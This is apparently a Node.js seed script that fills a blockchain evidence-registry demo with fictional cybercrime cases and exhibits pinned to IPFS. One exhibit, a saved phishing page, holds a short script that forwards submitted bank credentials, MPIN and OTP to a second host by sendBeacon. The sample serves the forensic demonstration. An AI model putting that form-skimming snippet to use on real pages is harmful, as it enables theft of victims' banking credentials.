/**
 * Builds a demonstration dataset: cases, evidence files pinned to IPFS, and
 * the matching registrations on the live contract.
 *
 * Why this exists. A redeployment moves the chain but not MongoDB, so the
 * database ends up holding evidence the contract has never heard of - the
 * lists render, every record fails to open, and the system looks broken when
 * it is merely out of step. Clearing both sides together and rebuilding from
 * one script keeps them honest.
 *
 * Evidence is registered by a throwaway OFFICER wallet because the server
 * holds no keys of its own by design: a real officer signs from MetaMask, and
 * nothing in this system can sign on their behalf. That wallet exists only to
 * produce demonstration data.
 *
 * Usage:
 *   node scripts/seed-demo.mjs --fresh     clear existing data first
 *   node scripts/seed-demo.mjs             add to whatever is already there
 *
 * It reads RPC_URL, CONTRACT_ADDRESS, MONGODB_URI, PINATA_JWT and
 * SEED_OFFICER_PRIVATE_KEY from backend/.env. The seed wallet must already
 * hold OFFICER and some gas - blockchain/scripts/assign-roles.js and
 * fund-accounts.js do both.
 */
import dotenv from "dotenv";
import mongoose from "mongoose";
import { ethers } from "ethers";
import { readFileSync } from "fs";
import path from "path";
import { fileURLToPath } from "url";

dotenv.config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const { uploadToPinata } = await import("../src/services/pinataService.js");
const Evidence = (await import("../src/models/Evidence.js")).default;
const Case = (await import("../src/models/Case.js")).default;
const Alert = (await import("../src/models/Alert.js")).default;
const AccessLog = (await import("../src/models/AccessLog.js")).default;
const User = (await import("../src/models/User.js")).default;

const FRESH = process.argv.includes("--fresh");

// The four wallets that hold roles on the deployed contract. Seeded into the
// user register so the administrator screen is populated before anyone has
// signed in for the first time.
const ROLE_HOLDERS = [
  { walletAddress: "0xd59C546811E9F6DF6B09ec3a63d0da98D2a2093c", name: "System Administrator", badgeId: "ADM-001", roleCache: "ADMIN" },
  { walletAddress: "0x8085D31a8ff75cfE446cFBcAfcfdDb2dB0c46Bc6", name: "Inspector A. Rao", badgeId: "OFF-114", roleCache: "OFFICER" },
  { walletAddress: "0x680B318d16809581BA93270Fa6cB8b0BE09dD9CE", name: "Investigator S. Mehta", badgeId: "INV-207", roleCache: "INVESTIGATOR" },
  { walletAddress: "0x99b5506C0438b846E27251249aCf8604F04d513f", name: "Judicial Reviewer", badgeId: "JUD-009", roleCache: "JUDICIARY" }
];

const CASES = [
  {
    caseId: "CASE-2026-001",
    title: "Phishing campaign targeting bank customers",
    description:
      "Bulk phishing mail impersonating a retail bank, directing recipients to a credential harvesting page. Reported by 14 complainants across the district."
  },
  {
    caseId: "CASE-2026-002",
    title: "UPI fraud through social engineering",
    description:
      "Complainant induced to approve a collect request during a call from a caller posing as customer support. Loss of INR 48,000."
  },
  {
    caseId: "CASE-2026-003",
    title: "Ransomware incident at district revenue office",
    description:
      "Workstations encrypted overnight; ransom note left on shared drive. Recovery from offline backup in progress."
  }
];

// Realistic evidence content. Held as text so the repository stays small and
// the files are readable in the interface during a demonstration - the
// integrity mechanism is indifferent to the format.
const EXHIBITS = [
  {
    caseId: "CASE-2026-001",
    filename: "phishing-email-headers.txt",
    fileType: "text/plain",
    description: "Full SMTP headers of the phishing mail received by complainant 1",
    body: [
      "Return-Path: <alerts@secure-bank-verify.example>",
      "Received: from mail.secure-bank-verify.example (203.0.113.47)",
      "        by mx.complainant.example with ESMTP id 4Hq8Xy2kLm",
      "        for <complainant1@example.com>; Mon, 09 Feb 2026 03:14:22 +0530",
      "Authentication-Results: mx.complainant.example;",
      "        spf=fail (sender IP is 203.0.113.47)",
      "        dkim=none; dmarc=fail",
      "From: \"Bank Security Team\" <alerts@secure-bank-verify.example>",
      "Subject: Urgent: your account will be suspended within 24 hours",
      "Message-ID: <20260209031422.4Hq8Xy2kLm@secure-bank-verify.example>",
      "",
      "Dear Customer,",
      "",
      "Unusual activity was detected on your account. Confirm your identity",
      "immediately at the link below or your account will be suspended.",
      "",
      "    hxxps://secure-bank-verify.example/login?ref=8821",
      "",
      "Bank Security Team"
    ].join("\n")
  },
  {
    caseId: "CASE-2026-001",
    filename: "harvesting-page-source.txt",
    fileType: "text/plain",
    description: "Saved HTML source of the credential harvesting page at 203.0.113.47",
    body: [
      "<!-- Captured 2026-02-09 11:40 IST by Cyber Cell, preserved verbatim -->",
      "<form id=\"login\" method=\"POST\" action=\"/collect.php\">",
      "  <input name=\"customer_id\" placeholder=\"Customer ID\" />",
      "  <input name=\"mpin\" type=\"password\" placeholder=\"MPIN\" />",
      "  <input name=\"otp\" placeholder=\"OTP\" />",
      "  <button type=\"submit\">Verify account</button>",
      "</form>",
      "<script>",
      "  // Credentials are forwarded to a second host before the page redirects",
      "  // the victim to the genuine bank site, so nothing appears wrong.",
      "  document.getElementById('login').addEventListener('submit', function (e) {",
      "    navigator.sendBeacon('https://203.0.113.88/x', new FormData(e.target));",
      "  });",
      "</script>"
    ].join("\n")
  },
  {
    caseId: "CASE-2026-002",
    filename: "call-transcript.txt",
    fileType: "text/plain",
    description: "Transcript of the recorded call between the complainant and the suspect",
    body: [
      "Transcript - incoming call to complainant, 2026-02-14 16:02 IST",
      "Duration 00:06:41. Recorded by complainant on handset.",
      "",
      "SUSPECT:      Madam, I am calling from the payments support team. There is a",
      "              failed refund of 48,000 rupees pending on your account.",
      "COMPLAINANT:  I did not request any refund.",
      "SUSPECT:      That is the problem. To release it you must approve the request",
      "              I am sending now. It will show as a collect request, that is",
      "              only the system format.",
      "COMPLAINANT:  It is asking me to enter my PIN.",
      "SUSPECT:      Yes, that confirms you are the account holder. Enter it quickly,",
      "              the request expires in two minutes.",
      "",
      "[Complainant approves. INR 48,000 debited at 16:08 IST.]"
    ].join("\n")
  },
  {
    caseId: "CASE-2026-003",
    filename: "ransom-note.txt",
    fileType: "text/plain",
    description: "Ransom note recovered from the encrypted shared drive",
    body: [
      "=== YOUR FILES HAVE BEEN ENCRYPTED ===",
      "",
      "All documents on this network have been encrypted with AES-256.",
      "Your decryption identifier: DRO-7742-XK",
      "",
      "To recover your files, contact us within 72 hours.",
      "After 72 hours the decryption key is deleted permanently.",
      "",
      "Do not attempt to use recovery software. Doing so will corrupt",
      "the files beyond repair.",
      "",
      "Contact: recovery-desk@example.onion"
    ].join("\n")
  }
];

const abi = JSON.parse(
  readFileSync(path.join(__dirname, "..", "src", "config", "contractAbi.json"), "utf-8")
);

async function main() {
  for (const name of ["RPC_URL", "CONTRACT_ADDRESS", "MONGODB_URI", "SEED_OFFICER_PRIVATE_KEY"]) {
    if (!process.env[name]) throw new Error(`${name} is not set in backend/.env`);
  }

  const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
  const officer = new ethers.Wallet(process.env.SEED_OFFICER_PRIVATE_KEY, provider);
  const registry = new ethers.Contract(process.env.CONTRACT_ADDRESS, abi, officer);

  const network = await provider.getNetwork();
  const role = ["NONE", "ADMIN", "OFFICER", "INVESTIGATOR", "JUDICIARY"][
    Number(await registry.getRole(officer.address))
  ];
  const balance = await provider.getBalance(officer.address);

  console.log(`\nNetwork      : chainId ${network.chainId}`);
  console.log(`Contract     : ${process.env.CONTRACT_ADDRESS}`);
  console.log(`Seed officer : ${officer.address}`);
  console.log(`  role       : ${role}`);
  console.log(`  balance    : ${ethers.formatEther(balance)} ETH\n`);

  if (role !== "OFFICER") {
    throw new Error(
      `The seed wallet holds ${role}, not OFFICER, so the contract will reject ` +
        `registerEvidence. Grant it with blockchain/scripts/assign-roles.js.`
    );
  }
  if (balance === 0n) {
    throw new Error("The seed wallet has no gas. Fund it with blockchain/scripts/fund-accounts.js.");
  }

  await mongoose.connect(process.env.MONGODB_URI);
  console.log("Connected to MongoDB");

  if (FRESH) {
    // Only the operational collections. Nothing here can touch what is already
    // on the chain, which stays as the permanent record either way.
    const removed = await Promise.all([
      Evidence.deleteMany({}),
      Case.deleteMany({}),
      Alert.deleteMany({}),
      AccessLog.deleteMany({}),
      User.deleteMany({})
    ]);
    console.log(
      `Cleared: ${removed[0].deletedCount} evidence, ${removed[1].deletedCount} cases, ` +
        `${removed[2].deletedCount} alerts, ${removed[3].deletedCount} access logs, ` +
        `${removed[4].deletedCount} users\n`
    );
  }

  for (const holder of ROLE_HOLDERS) {
    await User.findOneAndUpdate(
      { walletAddress: holder.walletAddress.toLowerCase() },
      { ...holder, walletAddress: holder.walletAddress.toLowerCase() },
      { upsert: true }
    );
  }
  console.log(`Registered ${ROLE_HOLDERS.length} role holders\n`);

  for (const c of CASES) {
    await Case.findOneAndUpdate(
      { caseId: c.caseId },
      { ...c, createdBy: officer.address.toLowerCase(), status: "under-investigation" },
      { upsert: true }
    );
    console.log(`Case ${c.caseId} - ${c.title}`);
  }
  console.log("");

  for (const exhibit of EXHIBITS) {
    const buffer = Buffer.from(exhibit.body, "utf8");

    const { cid, storage } = await uploadToPinata(buffer, exhibit.filename, {
      caseId: exhibit.caseId,
      uploadedBy: officer.address
    });
    console.log(`${exhibit.filename}`);
    console.log(`  stored  : ${storage}`);
    console.log(`  cid     : ${cid}`);

    if (storage !== "pinata") {
      console.warn("  WARNING : this file is only in the local cache, not on IPFS");
    }

    const tx = await registry.registerEvidence(
      exhibit.caseId,
      cid,
      exhibit.description,
      exhibit.fileType
    );
    const receipt = await tx.wait();

    // The id the contract assigned, read back from the event rather than
    // assumed from a counter on this side.
    const parsed = receipt.logs
      .map((log) => {
        try {
          return registry.interface.parseLog(log);
        } catch {
          return null;
        }
      })
      .find((e) => e && e.name === "EvidenceRegistered");

    const evidenceId = Number(parsed.args.evidenceId);

    await Evidence.findOneAndUpdate(
      { caseId: exhibit.caseId, cid },
      {
        evidenceId,
        caseId: exhibit.caseId,
        cid,
        description: exhibit.description,
        fileType: exhibit.fileType,
        fileSize: buffer.length,
        registeredBy: officer.address.toLowerCase(),
        txHash: receipt.hash,
        storage,
        status: "confirmed"
      },
      { upsert: true }
    );

    console.log(`  on-chain: #${evidenceId}  tx ${receipt.hash}\n`);
  }

  const total = Number(await registry.totalEvidence());
  console.log(`Done. The contract now holds ${total} evidence record(s).`);
  console.log(`https://sepolia.etherscan.io/address/${process.env.CONTRACT_ADDRESS}\n`);

  await mongoose.disconnect();
}

main().catch(async (err) => {
  console.error("\nSeed failed:", err.message);
  await mongoose.disconnect().catch(() => {});
  process.exitCode = 1;
});
